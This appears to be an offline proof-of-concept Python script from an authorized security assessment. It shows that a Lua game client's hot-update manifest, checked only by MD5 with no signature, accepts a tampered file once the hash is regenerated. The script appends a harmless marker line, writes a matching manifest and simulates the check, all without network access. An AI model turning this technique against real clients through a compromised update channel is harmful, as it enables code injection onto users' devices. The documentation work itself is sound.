#!/usr/bin/env python3
# 授权环境专用最小验证模板（Phase 5）。默认不发送任何网络请求；涉及设备的操作仅限授权的本地测试设备。
"""VULN-008 热更仅 MD5 校验 —— 本地「自洽恶意热更包」构造演示（partial PoC，纯离线）。

证据背景：
  - 热更 manifest 仅带 MD5（lua-src-apk/app/hotupdate/universe/hotfix/Manifest.lua:125 getProjectMd5/diffList；
    HotFixProcessor.lua:339-372 manifest 带 md5、:432-501 文件带 zipMd5），无签名。
  - 热更目录优先加载（main.lua:1-8 addSearchPath）。
  - 因此只要控制下发内容，同时改文件 + 改 md5 即可通过校验——本脚本在本地证明这一点。

边界（重要）：
  - 真实投递需控制热更下发通道（MITM/服务端），blocked_on=no_authorization_online，本脚本不做任何发送。
  - 本脚本只在 --out 目录构造本地样本并模拟客户端 md5 比对逻辑。
"""
import argparse
import hashlib
import json
import shutil
import sys
from pathlib import Path

POC_MARKER = 'print("PWNED-POC")  -- Phase5 授权验证标记'


def md5_of(p: Path) -> str:
    return hashlib.md5(p.read_bytes()).hexdigest()


def main() -> int:
    ap = argparse.ArgumentParser(
        description="VULN-008 本地构造自洽恶意热更包并模拟 Manifest.lua:125 的 md5 比对（纯离线）"
    )
    ap.add_argument("--src",
                    help="作为篡改基底的 Lua 文件路径（建议从 hotfix-decrypted/ 下任选一个 .lua）")
    ap.add_argument("--out", required=True, help="输出目录（本地构造热更包）")
    args = ap.parse_args()

    if not args.src:
        print("[-] 缺少 --src：请从 hotfix-decrypted/ 下任选一个 .lua 作为基底，例如：\n"
              "    python3 validate_request.py --src ../../../../hotfix-decrypted/src/app/<某文件>.lua --out ./poc_pkg",
              file=sys.stderr)
        return 2

    src = Path(args.src)
    if not src.is_file():
        print(f"[-] --src 不存在: {src}", file=sys.stderr)
        return 2

    out = Path(args.out)
    out.mkdir(parents=True, exist_ok=True)

    # 1. 复制并追加 PoC 标记行
    tampered = out / src.name
    shutil.copyfile(src, tampered)
    with tampered.open("a", encoding="utf-8") as f:
        f.write("\n" + POC_MARKER + "\n")
    tampered_md5 = md5_of(tampered)
    print(f"[+] 已生成篡改文件: {tampered} (md5={tampered_md5})")
    print(f"    原始文件 md5   : {md5_of(src)}")

    # 2. 生成 project.manifest（文件名 + md5，模拟 HotFixProcessor 的 manifest 语义）
    manifest = {
        "packageUrl": "https://example.invalid/hotfix/",  # 占位符，无真实服务器
        "files": {src.name: {"md5": tampered_md5}},
    }
    manifest_path = out / "project.manifest"
    manifest_path.write_text(json.dumps(manifest, indent=2, ensure_ascii=False), encoding="utf-8")
    print(f"[+] 已生成 manifest: {manifest_path}")

    # 3. 模拟客户端 Manifest.lua:125 的 md5 比对逻辑：文件 md5 == manifest.md5 即通过
    loaded = json.loads(manifest_path.read_text(encoding="utf-8"))
    all_pass = True
    for name, meta in loaded["files"].items():
        actual = md5_of(out / name)
        ok = (actual == meta["md5"])
        all_pass &= ok
        print(f"    [模拟校验] {name}: manifest={meta['md5']} actual={actual} -> {'PASS' if ok else 'FAIL'}")

    print(f"\n[+] 结论：篡改版热更包 md5 比对 {'全部通过' if all_pass else '未通过'}"
          "——md5 与文件同通道下发即自洽，md5-only 校验不构成防篡改。")
    print("[!] 真实投递需控制热更下发通道，blocked_on=no_authorization_online；本脚本未联网。")
    return 0


if __name__ == "__main__":
    sys.exit(main())
